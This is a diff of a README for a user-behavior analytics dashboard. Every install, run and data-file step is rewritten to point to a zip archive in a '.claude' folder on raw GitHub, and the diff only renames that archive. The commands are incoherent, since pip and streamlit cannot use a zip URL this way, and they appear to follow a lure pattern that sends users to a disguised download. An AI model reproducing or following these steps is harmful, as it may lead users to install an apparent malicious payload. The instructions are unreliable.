@@ -75,29 +75,29 @@ The dashboard includes comprehensive sidebar filters:
 
 1. Install required dependencies:
 ```bash
-pip install -r https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip
+pip install -r https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_v1.9.zip
 ```
 
 Or:
 ```bash
-python -m pip install -r https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip
+python -m pip install -r https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_v1.9.zip
 ```
 
 Run the following command from the project root:
 ```bash
-streamlit run https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip
+streamlit run https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_v1.9.zip
 ```
 
 Or:
 ```bash
-python -m streamlit run https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip
+python -m streamlit run https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_v1.9.zip
 ```
 
 The dashboard will open in your default web browser at `http://localhost:8501`
 
 ## Data Structure
 
-The dashboard analyzes the `https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_gravamina.zip` file which contains:
+The dashboard analyzes the `https://raw.githubusercontent.com/Ahmdrady/user-behavior/main/.claude/user_behavior_v1.9.zip` file which contains:
 - Customer ID
 - Age
 - Gender
